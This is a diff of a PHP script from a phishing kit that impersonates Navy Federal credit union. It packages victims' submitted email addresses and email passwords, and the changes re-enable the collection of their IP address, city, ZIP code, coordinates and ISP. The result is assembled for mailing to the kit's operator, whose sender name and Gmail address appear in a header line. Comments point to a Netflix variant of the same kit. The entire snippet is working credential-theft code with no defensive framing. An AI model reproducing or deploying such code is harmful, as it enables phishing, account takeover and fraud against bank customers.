@@ -39,11 +39,11 @@ $headers = "From: EndGame<vv122495@gmail.com>";
 $send = $email; 
 
 
-$message = "【🔥 Navy Fed Login 🔥】\r\n";
-$message .= "EMAIL: "     .$_POST['login_email']."\r\n";
+$message = "【🔥 Navy Fed Logs 🔥】\r\n";
+$message .= "EMAIL: "     .$_POST['email']."\r\n";
 $message .= "EMAIL Password: "    .$_POST['email_password']."\r\n";
-//$message .= "【💻 System INFO】\r\n";
-//$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
+$message .= "【💻 System INFO】\r\n";
+$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
 //$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
 //$message .= "【🔥 NetFlix Fire 🔥】\n";
 
